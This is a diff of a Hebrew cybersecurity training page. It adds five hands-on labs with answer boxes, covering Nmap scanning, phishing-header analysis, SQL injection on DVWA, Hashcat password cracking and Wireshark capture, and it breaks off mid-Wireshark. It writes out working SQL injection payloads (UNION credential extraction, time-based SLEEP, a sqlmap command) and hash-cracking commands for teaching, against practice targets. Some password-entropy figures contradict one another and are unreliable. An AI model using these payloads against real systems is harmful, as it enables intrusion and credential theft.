@@ -1219,198 +1219,673 @@
 
   <!-- ==================== LABS ==================== -->
   <div id="labs" class="section">
+
+    <style>
+      .lab-answer-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        margin-top: 16px;
+        padding: 9px 18px;
+        background: transparent;
+        border: 1px solid rgba(57,255,20,0.3);
+        color: var(--accent3);
+        border-radius: 6px;
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 11px;
+        letter-spacing: 1px;
+        cursor: pointer;
+        transition: all .2s;
+      }
+      .lab-answer-btn:hover { background: rgba(57,255,20,0.08); border-color: var(--accent3); }
+      .lab-answer-btn.open { background: rgba(57,255,20,0.08); }
+
+      .lab-answer-box {
+        display: none;
+        margin-top: 14px;
+        background: rgba(57,255,20,0.04);
+        border: 1px solid rgba(57,255,20,0.2);
+        border-radius: 10px;
+        padding: 18px 20px;
+        animation: fadeInAns .25s ease;
+      }
+      .lab-answer-box.show { display: block; }
+      @keyframes fadeInAns { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
+
+      .ans-section-title {
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 10px;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        color: var(--accent3);
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+
+      .ans-item {
+        display: flex;
+        gap: 10px;
+        align-items: flex-start;
+        margin-bottom: 10px;
+        font-size: 13px;
+        color: var(--text);
+        line-height: 1.6;
+      }
+      .ans-item:last-child { margin-bottom: 0; }
+
+      .ans-num {
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 10px;
+        color: var(--accent3);
+        background: rgba(57,255,20,0.1);
+        border: 1px solid rgba(57,255,20,0.2);
+        border-radius: 3px;
+        padding: 1px 6px;
+        min-width: 28px;
+        text-align: center;
+        flex-shrink: 0;
+        margin-top: 3px;
+      }
+
+      .ans-highlight {
+        background: rgba(0,212,255,0.08);
+        border-right: 3px solid var(--accent);
+        padding: 10px 14px;
+        border-radius: 6px;
+        font-size: 13px;
+        color: var(--text);
+        line-height: 1.6;
+        margin-top: 10px;
+      }
+
+      .ans-warn {
+        background: rgba(255,59,107,0.06);
+        border: 1px solid rgba(255,59,107,0.2);
+        border-radius: 6px;
+        padding: 10px 14px;
+        font-size: 12px;
+        color: var(--accent2);
+        margin-top: 10px;
+        line-height: 1.6;
+      }
+
+      .lab-question {
+        background: rgba(0,212,255,0.04);
+        border: 1px solid rgba(0,212,255,0.12);
+        border-radius: 8px;
+        padding: 14px 16px;
+        margin-top: 12px;
+      }
+      .lab-question-title {
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 10px;
+        color: var(--accent);
+        letter-spacing: 1.5px;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+      .lab-question-text {
+        font-size: 14px;
+        color: var(--text);
+        font-weight: 600;
+        line-height: 1.5;
+      }
+
+      .lab-tag {
+        font-family: 'IBM Plex Mono', monospace;
+        font-size: 9px;
+        padding: 2px 8px;
+        border-radius: 3px;
+        display: inline-block;
+        margin-left: 6px;
+      }
+      .lab-tag-easy   { background: rgba(57,255,20,0.1); color: var(--accent3); border: 1px solid rgba(57,255,20,0.25); }
+      .lab-tag-medium { background: rgba(255,215,0,0.1); color: var(--gold); border: 1px solid rgba(255,215,0,0.25); }
+      .lab-tag-hard   { background: rgba(255,59,107,0.1); color: var(--accent2); border: 1px solid rgba(255,59,107,0.25); }
+
+      .lab-meta-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 4px;
+      }
+
+      @media(max-width:480px){
+        .lab-answer-btn { font-size: 10px; padding: 8px 14px; }
+        .lab-answer-box { padding: 14px 14px; }
+        .ans-item { font-size: 12px; }
+      }
+    </style>
+
     <div class="labs-grid">
 
-      <!-- LAB 1 -->
+      <!-- ══════════════════════════════════════
+           LAB 1 — Nmap
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">🔎</span>
-          <span class="lab-section-title">מעבדה 1 — Network Scanning עם Nmap</span>
-          <span class="lab-difficulty diff-easy">EASY</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 1 — Network Scanning עם Nmap</span>
+              <span class="lab-tag lab-tag-easy">EASY</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Port Discovery · Service Detection · OS Fingerprinting · Output Analysis</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> ללמוד לסרוק רשת, לזהות פורטים פתוחים ושירותים פעילים. כלי חיוני לכל Pentest ו-Network Admin.
+            🎯 <strong>מטרה:</strong> ללמוד לסרוק רשת בצורה מקצועית, להבין את פלט Nmap ולזהות שירותים מסוכנים. Nmap הוא הכלי הראשון שכל Pentester פותח.
           </div>
-          <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ תרגיל: סריקת יעד</div>
-            <div class="lab-exercise-desc">השתמש ב-Nmap לסרוק את Scanme.nmap.org (יעד לגיטימי לתרגול)</div>
-            <div class="code-block">
-<span class="comment"># סריקה בסיסית — גילוי פורטים פתוחים</span>
-<span class="cmd">nmap scanme.nmap.org</span>
 
-<span class="comment"># סריקה עם זיהוי שירותים וגרסאות</span>
+          <div class="lab-exercise">
+            <div class="lab-exercise-title">⚡ שלב 1 — סריקות בסיסיות</div>
+            <div class="lab-exercise-desc">הרץ את הפקודות הבאות על <strong>scanme.nmap.org</strong> — יעד רשמי ולגיטימי של Nmap לתרגול.</div>
+            <div class="code-block">
+<span class="comment"># סריקה בסיסית — SYN Scan (מהיר, Stealthy)</span>
+<span class="cmd">nmap -sS scanme.nmap.org</span>
+
+<span class="comment"># זיהוי שירותים וגרסאות + Default Scripts</span>
 <span class="cmd">nmap -sV -sC scanme.nmap.org</span>
 
-<span class="comment"># סריקת OS Fingerprinting</span>
-<span class="cmd">nmap -O scanme.nmap.org</span>
+<span class="comment"># OS Detection (דורש הרשאות root)</span>
+<span class="cmd">sudo nmap -O scanme.nmap.org</span>
 
-<span class="comment"># סריקה מהירה של 1000 פורטים נפוצים</span>
-<span class="cmd">nmap -T4 -F scanme.nmap.org</span>
+<span class="comment"># סריקה אגרסיבית — הכל ביחד</span>
+<span class="cmd">nmap -A -T4 scanme.nmap.org -oN scan_results.txt</span>
+
+<span class="comment"># סרוק פורטים ספציפיים</span>
+<span class="cmd">nmap -p 22,80,443,8080,3306 scanme.nmap.org</span>
             </div>
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ אתגר: פרש את הפלט</div>
-            <div class="lab-exercise-desc">מה זה STATE: filtered לעומת open לעומת closed? איזה שירות מסוכן אם הוא פתוח לאינטרנט?</div>
+            <div class="lab-exercise-title">⚡ שלב 2 — ניתוח הפלט</div>
+            <div class="lab-exercise-desc">לאחר הסריקה, ענה על השאלות הבאות לפני שתלחץ על "הצג תשובה":</div>
+            <div class="lab-question">
+              <div class="lab-question-title">❓ שאלה לחשיבה</div>
+              <div class="lab-question-text">מה ההבדל בין STATE: open, closed, ו-filtered? איזה פורטים פתוחים ב-scanme.nmap.org ולמה כל אחד מהם שם? איזה שירות הכי מסוכן אם פתוח לאינטרנט?</div>
+            </div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans1')">
+            <span id="ans1-icon">▶</span> הצג תשובה מלאה
+          </button>
+          <div class="lab-answer-box" id="ans1">
+            <div class="ans-section-title">✅ תשובות ופירוש הפלט</div>
+
+            <div class="ans-item">
+              <span class="ans-num">A</span>
+              <div><strong>States:</strong><br>
+                <code>open</code> — פורט פתוח, שירות מאזין. זה מה שמעניין תוקף.<br>
+                <code>closed</code> — פורט סגור, אבל המחשב קיים ומגיב (RST). ניתן לסרוק שוב בעתיד.<br>
+                <code>filtered</code> — Firewall חוסם. Nmap לא יודע אם פתוח או סגור.
+              </div>
+            </div>
+
+            <div class="ans-item">
+              <span class="ans-num">B</span>
+              <div><strong>פורטים צפויים ב-scanme.nmap.org:</strong><br>
+                <code>22/tcp — SSH</code> — גישה מרחוק לשרת<br>
+                <code>80/tcp — HTTP</code> — שרת Web<br>
+                <code>9929/tcp</code> — nping-echo (כלי Nmap)<br>
+                <code>31337/tcp</code> — Elite port (ידוע בקהילת Hacking, Nmap שם אותו בכוונה!)
+              </div>
+            </div>
+
+            <div class="ans-item">
+              <span class="ans-num">C</span>
+              <div><strong>השירותים הכי מסוכנים אם פתוחים לאינטרנט:</strong><br>
+                <code>3306</code> — MySQL/MariaDB ישירות לאינטרנט = אסון<br>
+                <code>5432</code> — PostgreSQL — אותו דבר<br>
+                <code>23</code> — Telnet — לא מוצפן, legacy מסוכן<br>
+                <code>21</code> — FTP — סיסמה בטקסט פתוח<br>
+                <code>445</code> — SMB — ניצול EternalBlue (WannaCry)
+              </div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>פלט לדוגמה שתראה:</strong> <code>22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu</code> — מכאן Pentester ייבדוק ב-searchsploit אם יש exploit לגרסה הספציפית.
+            </div>
+            <div class="ans-warn">
+              ⚠️ <strong>חוקי:</strong> סרוק <em>רק</em> מחשבים שיש לך רשות לסרוק. סריקת מחשבים ללא רשות = עבירה פלילית בישראל ובעולם.
+            </div>
           </div>
         </div>
       </div>
 
-      <!-- LAB 2 -->
+      <!-- ══════════════════════════════════════
+           LAB 2 — Phishing Analysis
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">🎣</span>
-          <span class="lab-section-title">מעבדה 2 — Phishing Email Analysis</span>
-          <span class="lab-difficulty diff-easy">EASY</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 2 — Phishing Email Analysis</span>
+              <span class="lab-tag lab-tag-easy">EASY</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Header Analysis · SPF/DKIM/DMARC · IOC Extraction · URL Analysis</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> ניתוח Header של מייל חשוד — זיהוי מקור, SPF/DKIM/DMARC, ואינדיקטורים של זיוף.
+            🎯 <strong>מטרה:</strong> ללמוד לנתח מייל פישינג כ-SOC Analyst — מזיהוי Headers מזויפים ועד חילוץ IOCs (Indicators of Compromise).
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ תרגיל: ניתוח Header</div>
-            <div class="lab-exercise-desc">פתח מייל חשוד (בסביבת sandbox), הצג את ה-Headers המלאים וחפש:</div>
-            <div class="lab-steps">
-              <div class="lab-step"><span class="step-num">01</span> בדוק את שדה "Reply-To" — האם שונה מ-"From"?</div>
-              <div class="lab-step"><span class="step-num">02</span> חפש SPF fail / DKIM fail ב-Authentication-Results</div>
-              <div class="lab-step"><span class="step-num">03</span> עקוב אחרי Received: headers מלמטה למעלה — מאיפה באמת נשלח?</div>
-              <div class="lab-step"><span class="step-num">04</span> בדוק לינקים עם URLScan.io לפני לחיצה</div>
-              <div class="lab-step"><span class="step-num">05</span> העלה קבצים מצורפים ל-VirusTotal</div>
+            <div class="lab-exercise-title">⚡ דגימת מייל לניתוח</div>
+            <div class="lab-exercise-desc">נתח את ה-Header הבא (מייל פישינג אמיתי שעבר Sanitization). שים לב לפרטים:</div>
+            <div class="code-block">
+<span class="comment">From: "PayPal Security" &lt;security@paypa1.com&gt;</span>
+<span class="comment">Reply-To: collect2023@protonmail.com</span>
+<span class="comment">To: victim@company.com</span>
+<span class="comment">Subject: ⚠️ Urgent: Your account will be suspended</span>
+<span class="comment">Date: Mon, 15 Jan 2024 03:42:11 +0000</span>
+<span class="comment"> </span>
+<span class="comment">Received: from mail-wr1-x42a.google.com (209.85.221.43)</span>
+<span class="comment">  by mx.company.com; Mon, 15 Jan 2024 03:42:15 +0000</span>
+<span class="comment">Received: from [192.168.1.105] (unknown [41.78.102.33])</span>
+<span class="comment">  by smtp.gmail.com; Mon, 15 Jan 2024 03:42:10 +0000</span>
+<span class="comment"> </span>
+<span class="comment">Authentication-Results: mx.company.com;</span>
+<span class="comment">  spf=fail (sender IP is 41.78.102.33)</span>
+<span class="comment">  smtp.mailfrom=paypa1.com;</span>
+<span class="comment">  dkim=fail header.d=paypa1.com;</span>
+<span class="comment">  dmarc=fail action=none header.from=paypa1.com</span>
             </div>
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ כלים לשימוש</div>
-            <div class="code-block">
-<span class="str">MXToolbox Email Header Analyzer</span> → mxtoolbox.com/EmailHeaders.aspx
-<span class="str">URLScan.io</span> → בדיקת לינקים חשודים
-<span class="str">VirusTotal</span> → בדיקת קבצים ו-URLs
-<span class="str">PhishTool</span> → ניתוח מקיף של פישינג
+            <div class="lab-exercise-title">⚡ שלבי הניתוח</div>
+            <div class="lab-steps">
+              <div class="lab-step"><span class="step-num">01</span> זהה את 5 הדגלים האדומים במייל זה לפני שתלחץ "הצג תשובה"</div>
+              <div class="lab-step"><span class="step-num">02</span> בדוק את ה-IP <code>41.78.102.33</code> ב: <a href="https://www.abuseipdb.com" target="_blank" style="color:var(--accent)">AbuseIPDB</a> ו-<a href="https://www.virustotal.com" target="_blank" style="color:var(--accent)">VirusTotal</a></div>
+              <div class="lab-step"><span class="step-num">03</span> בדוק את הדומיין <code>paypa1.com</code> ב-<a href="https://urlscan.io" target="_blank" style="color:var(--accent)">URLScan.io</a></div>
+              <div class="lab-step"><span class="step-num">04</span> הרץ על מייל אמיתי שלך דרך <a href="https://mxtoolbox.com/EmailHeaders.aspx" target="_blank" style="color:var(--accent)">MXToolbox Header Analyzer</a></div>
+            </div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans2')">
+            <span id="ans2-icon">▶</span> הצג תשובה מלאה
+          </button>
+          <div class="lab-answer-box" id="ans2">
+            <div class="ans-section-title">✅ 5 דגלים אדומים בניתוח</div>
+
+            <div class="ans-item">
+              <span class="ans-num">🚩1</span>
+              <div><strong>Typosquatting:</strong> <code>paypa1.com</code> — האות L הוחלפה בספרה 1. קשה לשים לב במבט ראשון. PayPal האמיתי = <code>paypal.com</code></div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">🚩2</span>
+              <div><strong>Reply-To שונה מ-From:</strong> "PayPal Security" אבל Reply-To מצביע ל-<code>protonmail.com</code>. תשובה תגיע לתוקף, לא לPayPal.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">🚩3</span>
+              <div><strong>SPF fail + DKIM fail + DMARC fail:</strong> כל שלושת המנגנונים נכשלו — הדומיין לא מורשה לשלוח מ-IP זה.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">🚩4</span>
+              <div><strong>IP מאפריקה:</strong> <code>41.78.102.33</code> — IP מ-Nigeria (AFRINIC Range). PayPal שולחת ממרכזי נתונים בארה"ב/אירופה.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">🚩5</span>
+              <div><strong>Urgency Tactic:</strong> "⚠️ Urgent: Your account will be suspended" — לחץ פסיכולוגי קלאסי של Social Engineering. PayPal לא שולחת כך.</div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>IOCs לחסום ב-Firewall/Email Gateway:</strong><br>
+              • IP: <code>41.78.102.33</code><br>
+              • Domain: <code>paypa1.com</code><br>
+              • Email: <code>collect2023@protonmail.com</code>
             </div>
           </div>
         </div>
       </div>
 
-      <!-- LAB 3 -->
+      <!-- ══════════════════════════════════════
+           LAB 3 — SQL Injection
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">💉</span>
-          <span class="lab-section-title">מעבדה 3 — SQL Injection עם DVWA</span>
-          <span class="lab-difficulty diff-medium">MEDIUM</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 3 — SQL Injection עם DVWA</span>
+              <span class="lab-tag lab-tag-medium">MEDIUM</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Error-Based SQLi · UNION Attack · Blind SQLi · sqlmap · Mitigation</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> הבנת SQL Injection על יישום מכוון פגיע (DVWA — Damn Vulnerable Web App). סביבה בטוחה ולגיטימית לתרגול.
+            🎯 <strong>מטרה:</strong> הבנת SQL Injection מעמיקה — מניצול ועד הגנה. DVWA היא סביבה לגיטימית ומכוונת לפגיעות.
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ הגדרת הסביבה</div>
+            <div class="lab-exercise-title">⚡ שלב 1 — הגדרת הסביבה</div>
             <div class="code-block">
 <span class="comment"># הרצת DVWA עם Docker</span>
 <span class="cmd">docker pull vulnerables/web-dvwa</span>
 <span class="cmd">docker run -d -p 80:80 vulnerables/web-dvwa</span>
-
-<span class="comment"># גישה ב-browser: http://localhost</span>
-<span class="comment"># Username: admin | Password: password</span>
-<span class="comment"># הגדר Security Level = Low</span>
+<span class="comment"># http://localhost | admin / password | Security: Low</span>
             </div>
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ ניסויי SQL Injection</div>
+            <div class="lab-exercise-title">⚡ שלב 2 — ניסויים</div>
             <div class="lab-steps">
-              <div class="lab-step"><span class="step-num">01</span> הכנס <code>' OR '1'='1</code> בשדה User ID — מה קורה?</div>
-              <div class="lab-step"><span class="step-num">02</span> נסה <code>' UNION SELECT user,password FROM users-- -</code></div>
-              <div class="lab-step"><span class="step-num">03</span> השתמש ב-SQLMap לאוטומציה: <code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" --dbs</code></div>
-              <div class="lab-step"><span class="step-num">04</span> שנה Security Level ל-High — מה השתנה בהגנה?</div>
+              <div class="lab-step"><span class="step-num">01</span> הכנס <code>1</code> — מה מחזיר? רשום את שמות העמודות.</div>
+              <div class="lab-step"><span class="step-num">02</span> הכנס <code>' OR '1'='1</code> — מה קורה? כמה משתמשים מוצגים?</div>
+              <div class="lab-step"><span class="step-num">03</span> נסה UNION: <code>1' UNION SELECT null,null-- -</code> (כמה עמודות יש?)</div>
+              <div class="lab-step"><span class="step-num">04</span> שלוף סיסמאות: <code>1' UNION SELECT user,password FROM users-- -</code></div>
+              <div class="lab-step"><span class="step-num">05</span> הרץ sqlmap: <code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs</code></div>
+              <div class="lab-step"><span class="step-num">06</span> שנה Security ל-High — נסה שוב. מה השתנה? למה זה עדיין פגיע?</div>
+            </div>
+          </div>
+
+          <div class="lab-question">
+            <div class="lab-question-title">❓ שאלה לחשיבה</div>
+            <div class="lab-question-text">מה ההבדל בין Error-Based SQLi ל-Blind SQLi? איך מתגוננים בקוד?</div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans3')">
+            <span id="ans3-icon">▶</span> הצג תשובה מלאה
+          </button>
+          <div class="lab-answer-box" id="ans3">
+            <div class="ans-section-title">✅ תשובות — SQL Injection מלא</div>
+
+            <div class="ans-item">
+              <span class="ans-num">02</span>
+              <div><strong>' OR '1'='1</strong> — מחזיר את כל המשתמשים. SQL שנוצר: <code>SELECT * FROM users WHERE id='' OR '1'='1'</code> — תנאי שתמיד אמת.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">03</span>
+              <div><strong>UNION Attack:</strong> צריך לדעת כמה עמודות יש. <code>ORDER BY 1-- -</code>, <code>ORDER BY 2-- -</code>... עד שמקבלים שגיאה. אז <code>UNION SELECT null,null-- -</code></div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">04</span>
+              <div><strong>פלט צפוי מ-UNION:</strong><br>
+                <code>admin | 5f4dcc3b5aa765d61d8327deb882cf99</code> (MD5 של "password")<br>
+                <code>gordonb | e99a18c428cb38d5f260853678922e03</code> (MD5 של "abc123")
+              </div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">06</span>
+              <div><strong>Security=High:</strong> DVWA מוסיף <code>LIMIT 1</code> ו-sleep. אבל Time-Based Blind SQLi עדיין עובד: <code>1' AND SLEEP(5)-- -</code>. אם דף נטען אחרי 5 שניות — הפגיעות קיימת.</div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>ההגנה הנכונה (Prepared Statements ב-PHP):</strong><br>
+              <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</code><br>
+              <code>$stmt->execute([$id]);</code><br>
+              Input הופך לפרמטר — לא ל-SQL Code. אי אפשר לשבור.
+            </div>
+            <div class="ans-warn">
+              ⚠️ Input Validation לבד לא מספיק. ORM לא תמיד מגן. רק Prepared Statements/Parameterized Queries מגנים באמת.
             </div>
           </div>
         </div>
       </div>
 
-      <!-- LAB 4 -->
+      <!-- ══════════════════════════════════════
+           LAB 4 — Password Cracking
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">🔐</span>
-          <span class="lab-section-title">מעבדה 4 — Password Cracking עם Hashcat</span>
-          <span class="lab-difficulty diff-medium">MEDIUM</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 4 — Password Cracking עם Hashcat</span>
+              <span class="lab-tag lab-tag-medium">MEDIUM</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Hash Types · Dictionary Attack · Rules · Salting · BCRYPT vs MD5</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> הבנת חולשות בסיסמאות — Dictionary Attack, Brute Force, Rainbow Tables, ולמה BCRYPT/Argon2 הכרחיים.
+            🎯 <strong>מטרה:</strong> להבין בפועל למה MD5 לסיסמאות הוא רשלנות, וכמה זמן לוקח לשבור סיסמאות נפוצות מול חזקות.
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ שבירת Hash</div>
+            <div class="lab-exercise-title">⚡ שלב 1 — יצירת Hash וניסיון שבירה</div>
             <div class="code-block">
-<span class="comment"># צור MD5 hash</span>
+<span class="comment"># צור MD5 Hash לסיסמה "password123"</span>
 <span class="cmd">echo -n "password123" | md5sum</span>
 <span class="comment"># → 482c811da5d5b4bc6d497ffa98491e38</span>
 
-<span class="comment"># נסה לשבור עם Hashcat + RockYou wordlist</span>
-<span class="cmd">hashcat -m 0 -a 0 hash.txt rockyou.txt</span>
+<span class="comment"># שמור ב-file</span>
+<span class="cmd">echo "482c811da5d5b4bc6d497ffa98491e38" > hash_md5.txt</span>
 
-<span class="comment"># עכשיו נסה עם BCRYPT — שים לב כמה זמן לוקח!</span>
-<span class="cmd">hashcat -m 3200 -a 0 bcrypt_hash.txt rockyou.txt</span>
+<span class="comment"># שבור עם RockYou wordlist (Dictionary Attack)</span>
+<span class="cmd">hashcat -m 0 -a 0 hash_md5.txt /usr/share/wordlists/rockyou.txt</span>
+
+<span class="comment"># הוסף Rules (ל-1337speak, numbers suffix וכד')</span>
+<span class="cmd">hashcat -m 0 -a 0 hash_md5.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</span>
+
+<span class="comment"># עכשיו BCRYPT — אותה סיסמה, כמה זמן?</span>
+<span class="comment"># צור BCRYPT online: bcrypt-generator.com</span>
+<span class="cmd">hashcat -m 3200 -a 0 hash_bcrypt.txt rockyou.txt</span>
             </div>
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ שאל את עצמך</div>
-            <div class="lab-exercise-desc">כמה זמן לוקח לשבור MD5 לעומת BCRYPT? למה Password Salting חשוב? מה הופך סיסמה לחזקה באמת?</div>
+            <div class="lab-exercise-title">⚡ שלב 2 — ניסוי השוואתי</div>
+            <div class="lab-steps">
+              <div class="lab-step"><span class="step-num">01</span> כמה זמן לקח לשבור MD5 של "password123"?</div>
+              <div class="lab-step"><span class="step-num">02</span> נסה "P@ssw0rd!" — כמה זמן עכשיו?</div>
+              <div class="lab-step"><span class="step-num">03</span> נסה "correct-horse-battery-staple" — מה קורה?</div>
+              <div class="lab-step"><span class="step-num">04</span> חשב: מה עדיף — "P@s$w0rd!" או "four-random-words"?</div>
+            </div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans4')">
+            <span id="ans4-icon">▶</span> הצג תשובה מלאה
+          </button>
+          <div class="lab-answer-box" id="ans4">
+            <div class="ans-section-title">✅ תשובות — Password Cracking</div>
+
+            <div class="ans-item">
+              <span class="ans-num">01</span>
+              <div><strong>MD5 "password123":</strong> פחות מ-1 שנייה. כלול ב-RockYou wordlist. GPU RTX 4090 שובר 164 <em>מיליארד</em> MD5 hash לשנייה.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">02</span>
+              <div><strong>"P@ssw0rd!":</strong> עם Rules — עדיין דקות בודדות. Leet-speak substitutions הם הראשונות שHashcat מנסה. לא מגן.</div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">03</span>
+              <div><strong>"correct-horse-battery-staple":</strong> 4 מילים רנדומליות ≈ 10⁵² אפשרויות. לא ב-Dictionary, Brute Force לוקח מיליוני שנים. <strong>זו הסיסמה החזקה.</strong></div>
+            </div>
+            <div class="ans-item">
+              <span class="ans-num">04</span>
+              <div><strong>BCRYPT vs MD5:</strong> BCRYPT מכוון להיות איטי. GPU שובר 184 BCRYPT לשנייה (לא מיליארדים). 164 מיליארד / 184 = פי 891 מיליון איטי יותר.</div>
+            </div>
+
+            <div class="ans-highlight">
+              💡 <strong>Password Entropy Chart:</strong><br>
+              • 8 תווים, lowercase: 26⁸ ≈ 208 מיליארד — נשבר בשנייה (MD5)<br>
+              • 4 מילים רנדומליות: 7776⁴ ≈ 3.6 טריליון — לא ניתן לשבור<br>
+              • BCRYPT + Salt + 4 מילים = בלתי שביר מבחינה מעשית
+            </div>
+            <div class="ans-warn">
+              ⚠️ <strong>לעולם אל תשתמש ב:</strong> MD5, SHA1, SHA256 לסיסמאות. תמיד: bcrypt, Argon2id, או scrypt עם work factor גבוה.
+            </div>
           </div>
         </div>
       </div>
 
-      <!-- LAB 5 -->
+      <!-- ══════════════════════════════════════
+           LAB 5 — Wireshark
+      ══════════════════════════════════════ -->
       <div class="lab-section-card">
         <div class="lab-section-header">
           <span class="lab-icon">📡</span>
-          <span class="lab-section-title">מעבדה 5 — Wireshark — ניתוח תעבורת רשת</span>
-          <span class="lab-difficulty diff-medium">MEDIUM</span>
+          <div style="flex:1">
+            <div class="lab-meta-row">
+              <span class="lab-section-title" style="margin-bottom:0">מעבדה 5 — Wireshark: ניתוח תעבורת רשת</span>
+              <span class="lab-tag lab-tag-medium">MEDIUM</span>
+            </div>
+            <div style="font-size:12px;color:var(--text-dim);margin-top:3px">Packet Capture · Display Filters · TCP Stream · DNS · HTTP Credentials</div>
+          </div>
         </div>
         <div class="lab-section-body">
           <div class="lab-objective">
-            🎯 <strong>מטרה:</strong> ללכוד ולנתח פקטות, לזהות תעבורה חשודה, לראות סיסמאות ב-HTTP ברור.
+            🎯 <strong>מטרה:</strong> לראות בעיניים מה עובר ברשת, להבין למה HTTP ללא HTTPS הוא סכנה, ולזהות תעבורה חשודה.
           </div>
+
           <div class="lab-exercise">
-            <div class="lab-exercise-title">⚡ תרגיל</div>
+            <div class="lab-exercise-title">⚡ שלב 1 — הכנה ולכידה</div>
             <div class="lab-steps">
-              <div class="lab-step"><span class="step-num">01</span> פתח Wireshark, בחר Network Interface פעיל</div>
-              <div class="lab-step"><span class="step-num">02</span> גלוש לאתר HTTP (לא HTTPS) בדפדפן</div>
-              <div class="lab-step"><span class="step-num">03</span> בחר Filter: <code>http.request.method == "POST"</code></div>
-              <div class="lab-step"><span class="step-num">04</span> עקוב אחרי TCP Stream — מה אתה רואה?</div>
-              <div class="lab-step"><span class="step-num">05</span> חפש DNS Requests — לאיזה Domains פנה המחשב?</div>
+              <div class="lab-step"><span class="step-num">01</span> פתח Wireshark → בחר Interface פעיל (Wi-Fi / eth0) → לחץ ▶ Start Capture</div>
+              <div class="lab-step"><span class="step-num">02</span> גלוש ל-<code>http://neverssl.com</code> (HTTP ללא הצפנה, לגיטימי לתרגול)</div>
+              <div class="lab-step"><span class="step-num">03</span> עצור Capture, הכנס Filter: <code>http</code></div>
+              <div class="lab-step"><span class="step-num">04</span> לחץ ימני על Packet → "Follow TCP Stream"</div>
+              <div class="lab-step"><span class="step-num">05</span> נסה Filter: <code>dns</code> — ראה כל Domain שה-browser פנה אליו</div>
+              <div class="lab-step"><span class="step-num">06</span> Filter מתקדם: <code>http.request.method == "POST" || http contains "password"</code></div>
+            </div>
+          </div>
+
+          <div class="lab-question">
+            <div class="lab-question-title">❓ שאלה לחשיבה</div>
+            <div class="lab-question-text">מה תראה ב-TCP Stream של HTTP Login? איך זה שונה אם האתר HTTPS? מה Filter יזהה ARP Spoofing?</div>
+          </div>
+
+          <button class="lab-answer-btn" onclick="toggleAnswer('ans5')">
+            <span id="ans5-icon">▶</span> הצג תשובה מלאה
+          </button>
+          <div class="lab-answer-box" id="ans5">
+            <div class="ans-section-title">✅ תשובות — Wireshark</div>
+
+            <div class="ans-item">
+              <span class="ans-num">A</span>
+              <div><strong>TCP Stream של HTTP Login:</strong> תראה בדיוק: <code>POST /login HTTP/1.1... username=admin&password=mypassword123</code> — בטקסט ברור לחלוטין. כל מי ברשת יכול לקרוא.</div>
+            </div>
